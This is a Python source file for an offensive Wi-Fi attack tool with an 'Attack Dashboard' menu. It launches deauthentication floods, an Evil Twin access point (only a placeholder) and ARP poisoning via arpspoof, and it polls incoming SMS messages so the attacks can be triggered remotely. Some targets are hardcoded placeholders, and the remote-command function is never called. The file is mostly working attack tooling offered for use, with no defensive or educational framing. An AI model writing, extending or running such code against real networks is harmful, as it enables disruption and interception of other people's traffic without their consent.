import time
import subprocess
import threading
from rich.console import Console
from rich.table import Table
from sms import SMSExtractor
from deauth import Deauther

subprocess.run(["bash", "monitor_mode.sh"])

extractor = SMSExtractor()
console = Console()

# Start the background service
def start_service():
    console.log("[green]Starting Background Service...[/green]")
    while True:
        monitor_sms()
        time.sleep(10)  # Check every 10 seconds

# Monitor incoming SMS messages
def monitor_sms():
    console.log("[blue]Checking for SMS commands...[/blue]")
    latest_sms = extractor.get_latest_sms()
    return latest_sms

# Execute commands received remotely
def execute_remote_command(command):
    x = monitor_sms()
    command = x[2]
    print(command)
    console.log(f"[yellow]Executing command: {command}[/yellow]")
    if command == "deauth":
        run_deauth("target_MAC", "wlan1")
    elif command == "eviltwin":
        start_evil_twin("wlan1", "FakeSSID")
    elif command == "arp_poison":
        run_arp_poison("target_IP", "gateway_IP")
    else:
        console.log("[red]Unknown command![/red]")

# Run deauthentication attack
def run_deauth(target, interface, amount=50):
    console.log(f"[red]Running Deauth attack on {target} using {interface}[/red]")
    deauther = Deauther(target, interface, amount)
    deauther.deauth_attack()

# Start Evil Twin attack
def start_evil_twin(interface, ssid):
    console.log(f"[cyan]Starting Evil Twin attack with SSID: {ssid}[/cyan]")
    # Placeholder for setting up hostapd & dnsmasq

# Run ARP Poisoning
def run_arp_poison(target, gateway):
    console.log(f"[magenta]Running ARP Poisoning on {target} via {gateway}[/magenta]")
    subprocess.run(["arpspoof", "-i", "wlan1", "-t", target, gateway])

# CLI Dashboard
def cli_dashboard():
    console.clear()
    table = Table(title="Attack Dashboard")
    table.add_column("Option", justify="center")
    table.add_column("Action", justify="left")
    table.add_row("1", "Start Deauth Attack")
    table.add_row("2", "Start Evil Twin Attack")
    table.add_row("3", "Start ARP Poisoning")
    table.add_row("4", "Exit")
    console.print(table)

# Runner function
def runner():
    while True:
        cli_dashboard()
        choice = input("[bold yellow]Select an option: [/bold yellow]")
        if choice == "1":
            targetmac = input("Enter target BSSID: ")
            amount = int(input("Enter amount of packets to send: "))
            run_deauth(targetmac, "wlan1", amount)
        elif choice == "2":
            start_evil_twin("wlan1", "FakeSSID")
        elif choice == "3":
            run_arp_poison("target_IP", "gateway_IP")
        elif choice == "4":
            exit()
        else:
            console.log("[red]Invalid selection![/red]")

# Start the service in a separate thread
threading.Thread(target=start_service, daemon=True).start()
runner()

